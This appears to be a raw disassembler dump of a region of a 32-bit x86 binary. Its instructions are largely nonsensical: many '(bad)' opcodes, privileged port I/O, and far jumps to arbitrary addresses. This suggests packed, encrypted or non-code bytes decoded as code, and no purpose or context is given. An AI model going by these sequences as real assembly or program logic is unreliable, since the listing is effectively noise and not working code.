  41d8a7:	stos   DWORD PTR es:[edi],eax
  41d8a8:	mul    BYTE PTR [edi+0x1c]
  41d8ab:	add    ebp,DWORD PTR [ebp+edx*4+0x7c509692]
  41d8b2:	repnz push ecx
  41d8b4:	mov    eax,ds:0x0
	...
  41d915:	add    ah,al
  41d917:	ins    BYTE PTR es:[edi],dx
  41d918:	pop    es
  41d919:	pushf  
  41d91a:	scas   eax,DWORD PTR es:[edi]
  41d91b:	(bad)  
  41d91c:	fistp  QWORD PTR [ebx+eiz*8+0x0]
  41d920:	inc    eax
  41d921:	jmp    0x38be:0x73d59978
  41d928:	add    DWORD PTR [eax],eax
  41d92a:	pop    es
  41d92b:	add    DWORD PTR [eax],eax
  41d92d:	add    BYTE PTR [ebx+0x4a224600],dl
  41d933:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d934:	add    al,0xbd
  41d936:	(bad)  
  41d937:	sbb    DWORD PTR [eax+ebp*8+0x79fbe399],edx
  41d93e:	add    eax,edx
  41d940:	lods   al,BYTE PTR ds:[esi]
  41d941:	jno    0x41d912
  41d943:	and    bl,BYTE PTR [edx+edx*8]
  41d946:	mov    ebx,0x7b1bb514
  41d94b:	sub    edx,ebx
  41d94d:	mov    ch,0xaf
  41d94f:	into   
  41d950:	stc    
  41d951:	adc    DWORD PTR [ebp-0x55aa689f],eax
  41d957:	iret   
  41d958:	inc    ebx
  41d959:	js     0x41d953
  41d95b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d95c:	mov    bh,bh
  41d95e:	inc    ebx
  41d95f:	sti    
  41d960:	int    0xec
  41d962:	scas   eax,DWORD PTR es:[edi]
  41d963:	es icebp 
  41d965:	dec    edi
  41d966:	push   eax
  41d967:	in     al,0x5
  41d969:	js     0x41d97f
  41d96b:	push   ecx
  41d96c:	ins    BYTE PTR es:[edi],dx
  41d96d:	dec    eax
  41d96e:	out    0xb4,eax
  41d970:	sbb    DWORD PTR [ebp+eax*4-0x17650f1e],0xffffffbf
  41d978:	loope  0x41d96c
  41d97a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d97b:	ucomiss xmm2,DWORD PTR [edi-0x97e6e0b]
  41d982:	or     eax,0x76852a46
  41d987:	sbb    DWORD PTR [ebx],edi
  41d989:	leave  
  41d98a:	xchg   esi,eax
  41d98b:	jl     0x41d9cc
  41d98d:	jno    0x41d94a
  41d98f:	rol    DWORD PTR [ebx+esi*2],0xc3
  41d993:	lahf   
  41d994:	pop    ds
  41d995:	mov    eax,0xc93a0a30
  41d99a:	and    eax,0xcacd18c9
  41d99f:	jmp    0xcd74:0xd66cb2b1
  41d9a6:	iret   
  41d9a7:	adc    ah,BYTE PTR [edx]
  41d9a9:	mov    ds:0x6fd4f765,al
  41d9ae:	and    al,0xcc
  41d9b0:	test   ch,bl
  41d9b2:	lods   al,BYTE PTR ds:[esi]
  41d9b3:	cmp    eax,0xc3488d37
  41d9b8:	pmulhw mm7,mm1
  41d9bb:	xchg   ebp,eax
  41d9bc:	cmp    edi,DWORD PTR [esi]
  41d9be:	push   0x76a9ddc0
  41d9c3:	cmp    dh,BYTE PTR [edi+0x1b]
  41d9c6:	or     BYTE PTR [ecx-0x28f3c232],ch
  41d9cc:	in     eax,dx
  41d9cd:	mov    cl,0x6b
  41d9cf:	xor    al,0x32
  41d9d1:	jns    0x41d9bc
  41d9d3:	xchg   esi,eax
  41d9d4:	fcmovu st,st(0)
  41d9d6:	push   ds
  41d9d7:	xchg   BYTE PTR [ebx],dh
  41d9d9:	push   ebp
  41d9da:	in     al,dx
  41d9db:	(bad)  
  41d9dc:	mov    cl,0xe5
  41d9de:	mov    DWORD PTR fs:[ecx-0x58dcd413],eax
  41d9e5:	mov    al,ds:0x12d0626f
  41d9ea:	sbb    ah,BYTE PTR [edx-0x5b0a5c45]
  41d9f0:	call   0x88cd:0xdf6f17d5
  41d9f7:	pop    ds
  41d9f8:	into   
  41d9f9:	pop    ebx
  41d9fa:	mov    ecx,0x322a5408
  41d9ff:	push   edi
  41da00:	dec    esi
  41da01:	add    esi,0x85bf2b07
  41da07:	xor    esi,DWORD PTR [edx+0x4e]
  41da0a:	mov    esi,DWORD PTR [edx+0x6de83bfb]
  41da10:	shl    BYTE PTR [edx+edi*4-0x2cbcd0a1],0xb3
  41da18:	pop    esp
  41da19:	in     al,dx
  41da1a:	mov    fs,WORD PTR [ecx+ebp*1]
  41da1d:	adc    BYTE PTR [ebx-0x8],ch
  41da20:	fistp  DWORD PTR [ecx+eax*1+0x62]
  41da24:	jns    0x41da6c
  41da26:	lea    edi,[ecx+0x2e]
  41da29:	aaa    
  41da2a:	xor    DWORD PTR [ebp+0x5d],edi
  41da2d:	inc    edi
  41da2e:	and    BYTE PTR [esi],dh
  41da30:	bound  eax,QWORD PTR [ebx-0x14]
  41da33:	push   esi
  41da34:	jge    0x41da36
	...
  41da96:	sbb    al,0x15
  41da98:	jnp    0x41daed
  41da9a:	jnp    0x41db1b
  41da9c:	cmp    al,0x5f
  41da9e:	out    dx,al
  41da9f:	lahf   
  41daa0:	push   esi
  41daa1:	pop    es
  41daa2:	mov    WORD PTR ds:0x39c58803,?
  41daa8:	add    DWORD PTR [eax],eax
  41daaa:	pop    es
  41daab:	add    DWORD PTR [eax],eax
  41daad:	add    BYTE PTR [ecx+0x44],dl
  41dab0:	jbe    0x41daf0
  41dab2:	jbe    0x41da78
  41dab4:	cwde   
  41dab5:	mov    eax,ds:0xf3608dc0
  41daba:	aaa    
  41dabb:	jae    0x41da8f
  41dabd:	cmp    bh,0x7a
  41dac0:	shl    DWORD PTR [edi+0x5c],cl
  41dac3:	in     al,0x4a
  41dac5:	scas   eax,DWORD PTR es:[edi]
  41dac6:	mov    edi,0x3fd576eb
  41dacb:	neg    BYTE PTR [ebx]
  41dacd:	stos   DWORD PTR es:[edi],eax
  41dace:	frstor [esi+eax*4+0x63]
  41dad2:	pusha  
  41dad3:	push   ss
  41dad4:	mov    al,ds:0x756adf1d
  41dad9:	add    DWORD PTR [esi-0x45],edi
  41dadc:	mov    esp,edi
  41dade:	or     edi,0x35
  41dae1:	mov    cl,0xc9
  41dae3:	jo     0x41dac8
  41dae5:	ror    DWORD PTR [eax*1+0x3bf9fa23],cl
  41daec:	mov    dh,0x1c
  41daee:	or     BYTE PTR [eax-0xe67eca4],al
  41daf4:	stos   DWORD PTR es:[edi],eax
  41daf5:	into   
  41daf6:	test   eax,0x292564c8
  41dafb:	and    al,0x2e
  41dafd:	cmp    al,0xe
  41daff:	ret    
  41db00:	ins    DWORD PTR es:[edi],dx
  41db01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db02:	sbb    DWORD PTR [edx-0x203e07d8],esp
  41db08:	mov    ebp,0x69b47294
  41db0d:	cli    
  41db0e:	mov    cs,WORD PTR [edi]
  41db10:	mov    ebp,DWORD PTR [eax+0x2f290488]
  41db16:	sbb    dh,bl
  41db18:	fnstcw WORD PTR [ebx+edi*2+0x1e3f724d]
  41db1f:	mov    dl,0xde
  41db21:	push   ecx
  41db22:	xchg   ebp,eax
  41db23:	or     dh,al
  41db25:	pop    edx
  41db26:	mov    eax,ds:0x96371029
  41db2b:	out    0x7b,eax
  41db2d:	mov    dl,0x5c
  41db2f:	aam    0xf0
  41db31:	mov    BYTE PTR [ebx],al
  41db33:	or     DWORD PTR [edi+0x2c],edi
  41db36:	stos   DWORD PTR es:[edi],eax
  41db37:	xchg   ebp,eax
  41db38:	push   0x36458ffd
  41db3d:	mov    BYTE PTR [edi+0x5a218bc9],dh
  41db43:	mov    ch,BYTE PTR [edi]
  41db45:	mov    BYTE PTR [edi-0x65],cl
  41db48:	jo     0x41db8c
  41db4a:	iret   
  41db4b:	mov    ecx,DWORD PTR [ecx]
  41db4d:	jmp    0x41db24
  41db4f:	mov    esp,0x4a698ceb
  41db54:	ss fcom st(5)
  41db57:	inc    esp
  41db58:	jg     0x41db42
  41db5a:	push   ds
  41db5b:	inc    ebp
  41db5c:	xchg   DWORD PTR [ebp-0x15],ebp
  41db5f:	aaa    
  41db60:	outs   dx,BYTE PTR ds:[esi]
  41db61:	and    ebp,esp
  41db63:	aas    
  41db64:	jmp    0x41dbca
  41db66:	add    BYTE PTR [ecx+0x2b],dl
  41db69:	loope  0x41dbd9
  41db6b:	pop    ecx
  41db6c:	adc    al,0xd3
  41db6e:	cmp    DWORD PTR [ebx+0xf],ebx
  41db71:	cmp    eax,0x9a51da05
  41db76:	ja     0x41db42
  41db78:	pop    esp
  41db79:	pop    ebp
  41db7a:	jl     0x41dbeb
  41db7c:	push   ebx
  41db7d:	sbb    al,0x38
  41db7f:	inc    ecx
  41db80:	sub    eax,0x4ac86794
  41db85:	std    
  41db86:	xor    al,BYTE PTR [ecx+0x4]
  41db89:	outs   dx,BYTE PTR ds:[esi]
  41db8a:	dec    esi
  41db8b:	xlat   BYTE PTR ds:[ebx]
  41db8c:	das    
  41db8d:	and    al,bh
  41db8f:	(bad)  [edx+0x65]
  41db92:	push   0x14
  41db94:	mov    edi,0xf1e0e66a
  41db99:	sub    DWORD PTR [edx],edx
  41db9b:	leave  
  41db9c:	pop    esi
  41db9d:	inc    esp
  41db9e:	sbb    DWORD PTR [ebx],esi
  41dba0:	cli    
  41dba1:	cs (bad) 
  41dba3:	mov    dh,0x49
  41dba5:	sar    BYTE PTR [ebx-0x2cfb6f64],cl
  41dbab:	jp     0x41dbc7
  41dbad:	jb     0x41dc2b
  41dbaf:	popf   
  41dbb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbb1:	push   0xff58ea
	...
  41dc16:	outs   dx,DWORD PTR ds:[esi]
  41dc17:	retf   0x9815
  41dc1a:	mov    ch,0xdf
  41dc1c:	out    dx,eax
  41dc1d:	dec    ebp
  41dc1f:	ja     0x41dc8f
  41dc21:	aas    
  41dc22:	adc    BYTE PTR [edx-0x7a],ch
  41dc25:	aam    0xcc
  41dc27:	cmp    al,BYTE PTR [ecx]
  41dc29:	add    BYTE PTR [edi],al
  41dc2b:	add    DWORD PTR [eax],eax
  41dc2d:	add    BYTE PTR [eax],cl
  41dc2f:	or     esi,edi
  41dc31:	arpl   bx,bx
  41dc33:	aaa    
  41dc34:	and    BYTE PTR [ecx],ch
  41dc36:	cmp    bl,BYTE PTR [esi+ebp*8]
  41dc39:	retf   0x82ff
  41dc3c:	outs   dx,BYTE PTR ds:[esi]
  41dc3d:	or     BYTE PTR [ecx-0x65beb59b],dh
  41dc43:	xchg   esi,eax
  41dc44:	add    edi,DWORD PTR [edx+0x7b]
  41dc47:	adc    eax,DWORD PTR [ecx]
  41dc49:	rol    BYTE PTR [ecx+eiz*8],1
  41dc4c:	pop    ecx
  41dc4d:	or     DWORD PTR [ebp-0x34],0xae556f0b
  41dc54:	loopne 0x41dcd1
  41dc56:	lea    esi,[ecx+0x68]
  41dc59:	sbb    al,0x8b
  41dc5b:	sbb    al,0x57
  41dc5d:	sbb    ebp,DWORD PTR [ebp+0x3d3334f5]
  41dc63:	out    dx,eax
  41dc64:	jle    0x41dc53
  41dc66:	test   al,al
  41dc68:	out    dx,al
  41dc69:	sti    
  41dc6a:	xor    ecx,edi
  41dc6c:	xchg   ebp,eax
  41dc6d:	pusha  
  41dc6e:	int3   
  41dc6f:	ins    BYTE PTR es:[edi],dx
  41dc70:	mov    ds:0x998c773d,eax
  41dc75:	fucom  st(4)
  41dc77:	pop    edi
  41dc78:	sbb    BYTE PTR [ecx+0x79],cl
  41dc7b:	or     ch,0x8b
  41dc7e:	add    al,0x1f
  41dc80:	adc    ch,cl
  41dc82:	(bad)  [ebx-0xb]
  41dc85:	and    dh,ch
  41dc87:	adc    eax,0xdeec4585
  41dc8c:	sub    BYTE PTR [eax+0x25],al
  41dc8f:	retf   
  41dc90:	mov    al,ds:0x94781a8f
  41dc95:	push   0x77
  41dc97:	mov    ah,0x0
  41dc99:	in     al,0x3c
  41dc9b:	mov    ds:0xa977fb05,al
  41dca0:	stos   DWORD PTR es:[edi],eax
  41dca1:	xchg   edi,eax
  41dca2:	inc    esp
  41dca3:	cs pusha 
  41dca5:	je     0x41dc46
  41dca7:	sbb    eax,0x1f5f3841
  41dcac:	or     eax,DWORD PTR [eax]
  41dcae:	xlat   BYTE PTR ds:[ebx]
  41dcaf:	add    DWORD PTR [ecx+0x72900313],ebp
  41dcb5:	pop    esp
  41dcb6:	outs   dx,BYTE PTR ds:[esi]
  41dcb7:	add    eax,0x4bf6e203
  41dcbc:	adc    al,0xc8
  41dcbe:	int3   
  41dcbf:	xor    ah,al
  41dcc1:	mov    ebp,DWORD PTR [edx+edi*1]
  41dcc4:	in     al,0xb1
  41dcc6:	cdq    
  41dcc7:	addr16 out dx,al
  41dcc9:	sub    dh,BYTE PTR [eax+edx*8-0x5]
  41dccd:	out    0x7b,eax
  41dccf:	sahf   
  41dcd0:	in     al,0xb0
  41dcd2:	mov    ch,0xd6
  41dcd4:	fdiv   DWORD PTR [edi-0x3f]
  41dcd7:	sahf   
  41dcd8:	push   esp
  41dcd9:	mov    esp,0xeecb7111
  41dcde:	and    cl,ah
  41dce0:	mov    esi,0xcbc97475
  41dce5:	aad    0xeb
  41dce7:	lods   al,BYTE PTR ds:[esi]
  41dce8:	adc    bl,BYTE PTR [eax+0x4f8a2a53]
  41dcee:	dec    esp
  41dcef:	repz in eax,0xe9
  41dcf2:	jmp    0x7a8499a3
  41dcf7:	push   ds
  41dcf8:	or     DWORD PTR [edi+0x3b9b1314],ecx
  41dcfe:	mov    ds:0x8ce5c1ae,eax
  41dd03:	push   eax
  41dd04:	out    0x26,eax
  41dd06:	mov    ebx,0x5547794
  41dd0b:	stc    
  41dd0c:	ror    ch,0xc5
  41dd0f:	lods   eax,DWORD PTR ds:[esi]
  41dd10:	cdq    
  41dd11:	addr16 in al,0xb6
  41dd14:	sbb    BYTE PTR [edx],dh
  41dd16:	push   ss
  41dd17:	idiv   BYTE PTR [ebp-0x10228c65]
  41dd1d:	or     eax,0x171fe341
  41dd22:	cmp    edx,DWORD PTR [edi+edx*2-0x50e602f3]
  41dd29:	xchg   ecx,eax
  41dd2a:	mov    BYTE PTR [bx+di],ah
  41dd2d:	in     al,0x62
  41dd2f:	leave  
  41dd30:	pop    ebp
  41dd31:	les    edx,FWORD PTR [edi+0x5bbe]
	...
  41dd93:	add    BYTE PTR [eax],al
  41dd95:	add    BYTE PTR [eax],ah
  41dd97:	repz das 
  41dd99:	cmp    bh,0xde
  41dd9c:	lods   eax,DWORD PTR ds:[esi]
  41dd9d:	repz mov ds:0xc81667bb,eax
  41dda3:	sub    al,0xbf
  41dda5:	sub    edx,ebx
  41dda7:	cmp    eax,DWORD PTR [ecx]
  41dda9:	add    BYTE PTR [edi],al
  41ddab:	add    DWORD PTR [eax],eax
  41ddad:	add    BYTE PTR [esi],ah
  41ddaf:	(bad)  
  41ddb0:	adc    al,0xa9
  41ddb2:	push   eax
  41ddb3:	jge    0x41ddb5
  41ddb5:	stos   DWORD PTR es:[edi],eax
  41ddb6:	fdivp  st(2),st
  41ddb8:	test   bl,0x38
  41ddbb:	push   edx
  41ddbc:	inc    esi
  41ddbd:	jge    0x41dda0
  41ddbf:	jmp    0x85985359
  41ddc4:	xchg   esp,eax
  41ddc5:	inc    ebx
  41ddc6:	pop    ss
  41ddc7:	pop    edx
  41ddc8:	jne    0x41ddee
  41ddca:	loopne 0x41ddaa
  41ddcc:	mov    bl,0xa
  41ddce:	xchg   esp,eax
  41ddcf:	pop    ss
  41ddd0:	mov    ds:0x23a633bb,eax
  41ddd5:	jl     0x41dd8e
  41ddd7:	pop    esi
  41ddd8:	mov    ds:0xc3822f42,eax
  41dddd:	outs   dx,DWORD PTR ds:[esi]
  41ddde:	xchg   edi,eax
  41dddf:	rol    BYTE PTR [ebx+ebp*8+0x26],1
  41dde3:	outs   dx,DWORD PTR ds:[esi]
  41dde4:	ds pusha 
  41dde6:	mov    dl,0x8f
  41dde8:	sub    al,0xc8
  41ddea:	mov    bl,0x31
  41ddec:	mov    eax,0x44ce9df8
  41ddf1:	(bad)  [edx]
  41ddf3:	cdq    
  41ddf4:	in     eax,dx
  41ddf5:	adc    BYTE PTR gs:[edi+0x54ad15d8],bl
  41ddfc:	xor    BYTE PTR [eax-0x6d],cl
  41ddff:	adc    al,0xc0
  41de01:	dec    esp
  41de02:	sbb    eax,0x2b982ba6
  41de07:	mov    dl,0xad
  41de09:	cwde   
  41de0a:	xor    eax,DWORD PTR [ecx]
  41de0c:	mov    bh,0xed
  41de0e:	mov    al,0xe3
  41de10:	jle    0x41ddd7
  41de12:	sub    BYTE PTR [ebx+0xf],bl
  41de15:	in     eax,0xbc
  41de17:	inc    esi
  41de18:	push   esp
  41de19:	stc    
  41de1a:	push   ebp
  41de1b:	ins    DWORD PTR es:[edi],dx
  41de1c:	jno    0x41de49
  41de1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de1f:	stos   DWORD PTR es:[edi],eax
  41de20:	adc    bh,cl
  41de22:	fwait
  41de23:	stos   BYTE PTR es:[edi],al
  41de24:	retf   0x4b30
  41de27:	mov    esp,0x6b57594e
  41de2c:	jae    0x41ddd0
  41de2e:	dec    esp
  41de2f:	sub    DWORD PTR [ecx+ecx*1-0x63],esp
  41de33:	and    DWORD PTR [edi],eax
  41de35:	jb     0x41de23
  41de37:	and    al,cl
  41de39:	into   
  41de3a:	ret    
  41de3b:	and    al,0x9f
  41de3d:	in     al,dx
  41de3e:	push   edx
  41de3f:	mov    ss,esi
  41de41:	jo     0x41de87
  41de43:	pop    ecx
  41de44:	mov    al,ds:0xae2e341
  41de49:	push   edi
  41de4a:	out    dx,eax
  41de4b:	je     0x41de5a
  41de4d:	ficomp DWORD PTR [edx]
  41de4f:	pop    es
  41de50:	or     cl,bl
  41de52:	std    
  41de53:	aaa    
  41de54:	out    0xdc,al
  41de56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de57:	mov    eax,0xedbd0c61
  41de5c:	dec    ebx
  41de5d:	lea    edi,[ebp-0x13]
  41de60:	adc    al,0xfa
  41de62:	add    DWORD PTR [ebx-0x218ba9fe],0xffffff99
  41de69:	ins    BYTE PTR es:[edi],dx
  41de6a:	adc    bl,BYTE PTR [edi-0x26]
  41de6d:	icebp  
  41de6e:	xor    eax,0xd130d7a7
  41de73:	bnd call 0x86fde6b9
  41de79:	pop    esp
  41de7a:	mov    esp,0xeb926e8f
  41de7f:	aad    0xb
  41de81:	addr16 sub al,0xeb
  41de84:	push   ebp
  41de85:	inc    edi
  41de86:	jne    0x41dea0
  41de88:	lods   al,BYTE PTR ds:[esi]
  41de89:	pushf  
  41de8a:	es pop eax
  41de8c:	in     eax,dx
  41de8d:	and    ah,ah
  41de8f:	retf   
  41de90:	hlt    
  41de91:	sub    al,0x22
  41de93:	das    
  41de94:	dec    ebp
  41de95:	dec    esi
  41de96:	shr    edx,1
  41de98:	js     0x41df10
  41de9a:	xor    bl,BYTE PTR [esi+eiz*1]
  41de9d:	xor    edi,0x6f3ba96a
  41dea3:	scas   al,BYTE PTR es:[edi]
  41dea4:	xor    eax,0x4fe7ca19
  41dea9:	lods   al,BYTE PTR ds:[esi]
  41deaa:	jno    0x41defd
  41deac:	and    eax,0x2af85e95
  41deb1:	fistp  DWORD PTR [ecx+0x1]
  41deb4:	mov    eax,0x0
	...
  41df15:	add    BYTE PTR [edi],bh
  41df17:	daa    
  41df18:	push   ss
  41df19:	cld    
  41df1a:	push   ds
  41df1b:	std    
  41df1c:	jmp    edi
  41df1e:	pop    es
  41df1f:	adc    eax,0xd815c191
  41df24:	jbe    0x41dec4
  41df26:	fidivr DWORD PTR [ecx+eax*1]
  41df29:	add    BYTE PTR [edi],al
  41df2b:	add    DWORD PTR [eax],eax
  41df2d:	add    BYTE PTR [edi+edx*8+0x50],ah
  41df31:	adc    al,0xe3
  41df33:	cmc    
  41df34:	mov    ecx,0x8aca7329
  41df39:	(bad)  
  41df3b:	scas   eax,DWORD PTR es:[edi]
  41df3c:	adc    BYTE PTR [edx-0x10e799b3],dl
  41df42:	dec    ebp
  41df43:	sub    ch,BYTE PTR [edx-0x1157679]
  41df49:	jp     0x41dfb8
  41df4b:	mov    ds:0xfdeb47cf,al
  41df50:	xlat   BYTE PTR ds:[ebx]
  41df51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df53:	dec    ebp
  41df54:	fsub   QWORD PTR [eax-0x2cfafd34]
  41df5a:	sbb    eax,0x9512c20
  41df5f:	test   al,0x37
  41df61:	adc    edi,0xc6ebcd99
  41df67:	sub    al,0x79
  41df69:	and    ecx,DWORD PTR [ebx]
  41df6b:	adc    bh,cl
  41df6d:	test   BYTE PTR [eax],dh
  41df6f:	mov    dl,0x0
  41df71:	repz imul esi,esi,0xffffffc8
  41df75:	jg     0x41df3b
  41df77:	pop    esi
  41df78:	fs test al,0xcb
  41df7b:	retf   
  41df7c:	mov    ebp,DWORD PTR ds:0x1db9b41e
  41df82:	xchg   ebx,eax
  41df83:	mov    dl,BYTE PTR [edi]
  41df85:	inc    esi
  41df86:	xor    al,0x84
  41df88:	shr    BYTE PTR [ebx-0x36],cl
  41df8b:	(bad)  [esi-0x120871cd]
  41df91:	int    0x13
  41df93:	inc    edi
  41df94:	jmp    0x41df50
  41df96:	repz xor al,0xf1
  41df99:	test   DWORD PTR [edi+0x11167161],0x87c441d8
  41dfa3:	jae    0x41dfcf
  41dfa5:	mov    ch,0x0
  41dfa7:	mov    eax,0xa48f0c35
  41dfac:	jbe    0x41e024
  41dfae:	jg     0x41e02f
  41dfb0:	jns    0x41dfcc
  41dfb2:	jno    0x41e007
  41dfb4:	mov    BYTE PTR ds:0x5ede152b,dh
  41dfba:	or     DWORD PTR [edx],ecx
  41dfbc:	xchg   BYTE PTR ds:0x479da5f7,cl
  41dfc2:	xchg   ebp,eax
  41dfc3:	dec    edi
  41dfc4:	push   ebx
  41dfc5:	adc    eax,0xe3757269
  41dfca:	shr    DWORD PTR [edi-0x69],1
  41dfcd:	jecxz  0x41df94
  41dfcf:	retf   
  41dfd0:	add    BYTE PTR [ecx],dh
  41dfd2:	rcr    BYTE PTR [ebx],1
  41dfd4:	xchg   DWORD PTR [edx+0x6bdb1661],ebx
  41dfda:	pop    es
  41dfdb:	in     eax,0x58
  41dfdd:	jo     0x41e041
  41dfdf:	add    eax,0x34f3eb65
  41dfe4:	push   es
  41dfe5:	mov    eax,ds:0x8dcaf8a5
  41dfea:	jecxz  0x41df8b
  41dfec:	inc    ecx
  41dfed:	jae    0x41e003
  41dfef:	mov    dh,0x3f
  41dff1:	inc    esi
  41dff2:	data16 jp 0x41e067
  41dff5:	jno    0x41dfac
  41dff7:	pop    edi
  41dff8:	sub    BYTE PTR [esi],0x1d
  41dffb:	push   ss
  41dffc:	dec    edi
  41dffd:	inc    esp
  41dffe:	fsub   QWORD PTR [esi]
  41e000:	jne    0x41e076
  41e002:	clc    
  41e003:	out    0x49,eax
  41e005:	jbe    0x41e01b
  41e007:	pop    edx
  41e008:	in     al,0x36
  41e00a:	ins    DWORD PTR es:[edi],dx
  41e00b:	test   ebp,edx
  41e00d:	lds    esp,FWORD PTR [ebp-0x41ef6155]
  41e013:	repz sti 
  41e015:	and    ebx,DWORD PTR [eax+0x6cf851aa]
  41e01b:	xchg   esp,eax
  41e01c:	rol    BYTE PTR [eax],0x38
  41e01f:	ins    DWORD PTR es:[edi],dx
  41e020:	mov    ah,0x3f
  41e022:	(bad)  
  41e024:	push   edi
  41e025:	ss sahf 
  41e027:	dec    esi
  41e028:	jl     0x41e022
  41e02a:	inc    edi
  41e02b:	xor    BYTE PTR [edx+0x17d233b5],ah
  41e031:	sub    BYTE PTR [ecx+0x1a],al
  41e034:	mov    esp,0x0
	...
  41e095:	add    BYTE PTR [edi+0x53],cl
  41e098:	add    al,0xc
  41e09a:	sbb    al,0x5f
  41e09c:	dec    edi
  41e09d:	push   ebx
  41e09e:	out    0x48,eax
  41e0a0:	jge    0x41e0ce
  41e0a2:	xchg   esi,eax
  41e0a3:	mov    cl,BYTE PTR [ebx+0x13de1e1]
  41e0a9:	add    BYTE PTR [edi],al
  41e0ab:	add    DWORD PTR [eax],eax
  41e0ad:	add    al,dh
  41e0af:	les    ebp,FWORD PTR [ebp-0x64]
  41e0b2:	or     esp,edx
  41e0b4:	and    esp,DWORD PTR [eax]
  41e0b6:	jo     0x41e04c
  41e0b8:	jbe    0x41e08b
  41e0ba:	sbb    eax,0x6b429257
  41e0bf:	adc    BYTE PTR [ebx+0x70],dh
  41e0c2:	cmp    esi,DWORD PTR [edi+0x56]
  41e0c5:	mov    eax,0x89566ed9
  41e0ca:	inc    ebp
  41e0cb:	into   
  41e0cc:	icebp  
  41e0cd:	mov    ebp,0xe9db067c
  41e0d2:	inc    BYTE PTR [eax+0x76]
  41e0d5:	push   es
  41e0d6:	psubusb mm0,QWORD PTR [esi+0x1f]
  41e0da:	jbe    0x41e096
  41e0dc:	(bad)  
  41e0dd:	sub    al,0x3
  41e0df:	test   DWORD PTR [esi-0x2],ecx
  41e0e2:	ror    BYTE PTR [ebx],0x14
  41e0e5:	ret    
  41e0e6:	imul   ebx,DWORD PTR [esi+0x60900a6b],0xb649e914
  41e0f0:	or     DWORD PTR [edi],0x5565c46c
  41e0f6:	jle    0x41e0df
  41e0f8:	js     0x41e0f9
  41e0fa:	xor    edx,0x3ecce85f
  41e100:	mov    eax,ds:0xc16f59b4
  41e105:	or     ebx,DWORD PTR [edx]
  41e107:	mov    ebx,0x67eff74
  41e10c:	jmp    0x273479d9
  41e111:	loope  0x41e0f3
  41e113:	fld    TBYTE PTR [edi-0x6979b92]
  41e119:	xchg   esi,eax
  41e11a:	dec    esp
  41e11b:	shl    BYTE PTR [edx+0x48467991],cl
  41e121:	mov    ecx,0x74d094dc
  41e126:	or     al,0x2e
  41e128:	jno    0x41e190
  41e12a:	inc    edx
  41e12b:	leave  
  41e12c:	inc    edx
  41e12d:	and    BYTE PTR [edi],al
  41e12f:	sbb    BYTE PTR [ecx+0x2c7a8376],bh
  41e135:	(bad)  
  41e136:	aam    0x7d
  41e138:	sub    al,0xf6
  41e13a:	fisubr DWORD PTR [edi]
  41e13c:	xchg   edx,eax
  41e13d:	xchg   esi,eax
  41e13e:	in     eax,dx
  41e13f:	test   al,0xbf
  41e141:	fnstcw WORD PTR [ebp-0x7d141253]
  41e147:	ret    0x3e22
  41e14a:	fiadd  DWORD PTR [ebp-0x71]
  41e14d:	mov    edi,0x4ead78a5
  41e152:	out    0xf2,al
  41e154:	cmp    al,0x31
  41e156:	nop
  41e157:	scas   eax,DWORD PTR es:[edi]
  41e158:	bswap  ebp
  41e15a:	mov    edx,0x2b89a111
  41e15f:	add    al,0xd9
  41e161:	out    0xf9,al
  41e163:	fistp  WORD PTR [eax+0x2c]
  41e166:	aas    
  41e167:	xor    al,dh
  41e169:	nop
  41e16a:	imul   ebp,DWORD PTR [ebp+0x13],0xefae7701
  41e171:	push   es
  41e172:	or     al,0xe7
  41e174:	mov    eax,0xc13d3e38
  41e179:	test   DWORD PTR [ebp+0x2cb85d4a],esi
  41e17f:	loop   0x41e17f
  41e181:	cwde   
  41e182:	xchg   esi,eax
  41e183:	jmp    0x41e161
  41e185:	mov    esi,0xe9f21a85
  41e18a:	loope  0x41e1d1
  41e18c:	in     al,dx
  41e18d:	pop    ds
  41e18e:	pop    esp
  41e18f:	sbb    esp,0x235a58ac
  41e195:	pop    es
  41e196:	dec    ebx
  41e197:	test   al,0x5f
  41e199:	mov    esi,DWORD PTR [edi+eax*2+0x6c]
  41e19d:	aas    
  41e19e:	ret    
  41e19f:	arpl   WORD PTR [ecx-0x79],di
  41e1a2:	pop    es
  41e1a3:	mov    ds,WORD PTR [esp+eax*4+0x76fdb828]
  41e1aa:	mov    edx,0x572aed5f
  41e1af:	or     edx,DWORD PTR [edx+ebx*1+0x112c8f]
	...
  41e216:	stos   DWORD PTR es:[edi],eax
  41e217:	add    dh,BYTE PTR [edi-0x1a]
  41e21a:	push   edi
  41e21c:	mov    ebx,0xf08a4a4f
  41e221:	mov    edi,edi
  41e223:	mov    ah,0x36
  41e225:	in     eax,dx
  41e226:	call   0x741e369
  41e22b:	add    DWORD PTR [eax],eax
  41e22d:	add    BYTE PTR [ecx+0x7d],al
  41e230:	pop    ebp
  41e231:	and    eax,0x706d3a7c
  41e236:	daa    
  41e237:	(bad)  
  41e238:	sbb    eax,DWORD PTR [esi+0x3dbd1870]
  41e23e:	unpcklps xmm5,XMMWORD PTR [ebp-0x78]
  41e242:	dec    ebx
  41e243:	pop    es
  41e244:	pop    esp
  41e245:	push   ss
  41e246:	mov    bl,0xab
  41e248:	jle    0x41e1cd
  41e24a:	nop
  41e24b:	mov    dh,0xa5
  41e24d:	xor    esi,0x56
  41e250:	sbb    eax,0x69c1f381
  41e255:	out    dx,al
  41e256:	push   0xffffff8a
  41e258:	xchg   ebx,eax
  41e259:	add    eax,eax
  41e25b:	(bad)  
  41e25f:	xchg   ebx,eax
  41e260:	(bad)  
  41e261:	jmp    0x41e26c
  41e263:	int3   
  41e264:	and    BYTE PTR [ebx],bh
  41e266:	inc    esi
  41e267:	sub    al,0x5f
  41e269:	jb     0x41e2aa
  41e26b:	mov    ebp,0x17c67ccf
  41e270:	test   BYTE PTR [ecx],bl
  41e272:	mov    ebp,0xcee51852
  41e277:	pop    ss
  41e278:	inc    eax
  41e279:	lods   eax,DWORD PTR ds:[esi]
  41e27a:	ins    BYTE PTR es:[edi],dx
  41e27b:	mov    cl,0x12
  41e27d:	leave  
  41e27e:	adc    ch,bl
